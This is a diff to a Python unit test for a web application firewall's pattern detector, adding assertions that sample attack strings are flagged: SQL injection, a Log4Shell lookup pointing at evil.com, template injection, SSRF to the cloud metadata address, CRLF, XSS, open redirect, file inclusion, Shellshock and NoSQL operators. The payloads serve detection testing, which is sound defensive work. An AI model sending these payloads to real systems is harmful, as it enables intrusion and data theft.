@@ -856,12 +856,53 @@ async def test_engine_honeypot_persistence_with_valid_ticket():
 
 def test_malicious_patterns_waf():
     """Vérifie la détection d'injections malveillantes via MaliciousPatterns."""
+    # SQL / SSTI / Log4Shell / XXE
     assert MaliciousPatterns.is_malicious("SELECT * FROM users;--") is True
     assert MaliciousPatterns.is_malicious("UNION SELECT username, password") is True
     assert MaliciousPatterns.is_malicious("${jndi:ldap://evil.com/a}") is True
     assert MaliciousPatterns.is_malicious("{{ 7*7 }}") is True
     assert MaliciousPatterns.is_malicious("cat /etc/passwd") is True
     assert MaliciousPatterns.is_malicious("normal comment text") is False
+
+    # SSRF
+    assert MaliciousPatterns.is_malicious("http://127.0.0.1/admin") is True
+    assert MaliciousPatterns.is_malicious("https://localhost:8443") is True
+    assert MaliciousPatterns.is_malicious("http://169.254.169.254/latest/meta-data") is True
+    assert MaliciousPatterns.is_malicious("https://google.com") is False
+
+    # CRLF
+    assert MaliciousPatterns.is_malicious("test\r\nHeader: value") is True
+    assert MaliciousPatterns.is_malicious("%0d%0aHeader: value") is True
+    assert MaliciousPatterns.is_malicious("clean string") is False
+
+    # XSS
+    assert MaliciousPatterns.is_malicious("<script>alert(1)</script>") is True
+    assert MaliciousPatterns.is_malicious("javascript:alert(1)") is True
+    assert MaliciousPatterns.is_malicious("<img src=x onerror=alert(1)>") is True
+    assert MaliciousPatterns.is_malicious("<b>bold text</b>") is False
+
+    # Open Redirect
+    assert MaliciousPatterns.is_malicious("https://evil.com/redirect", ["openRedirect"]) is True
+    assert MaliciousPatterns.is_malicious("//malicious-site.com", ["openRedirect"]) is True
+    assert MaliciousPatterns.is_malicious("/local/path", ["openRedirect"]) is False
+    assert MaliciousPatterns.is_malicious("http://localhost/dashboard", ["openRedirect"]) is False
+
+    # LFI/RFI
+    assert MaliciousPatterns.is_malicious("etc/passwd") is True
+    assert MaliciousPatterns.is_malicious("win.ini") is True
+    assert MaliciousPatterns.is_malicious("php://filter/resource=index.php") is True
+    assert MaliciousPatterns.is_malicious("normal_file.txt") is False
+
+    # Shellshock
+    assert MaliciousPatterns.is_malicious("() { :; }; echo 'Vulnerable'") is True
+    assert MaliciousPatterns.is_malicious("() { :;};") is True
+    assert MaliciousPatterns.is_malicious("def test(): pass") is False
+
+    # NoSQL Operator Injection
+    assert MaliciousPatterns.is_malicious("$gt") is True
+    assert MaliciousPatterns.is_malicious("$elemMatch") is True
+    assert MaliciousPatterns.is_malicious("$where") is True
+    assert MaliciousPatterns.is_malicious("This is $10") is False
 
 @pytest.mark.asyncio
 async def test_ip_reputation_and_decay():
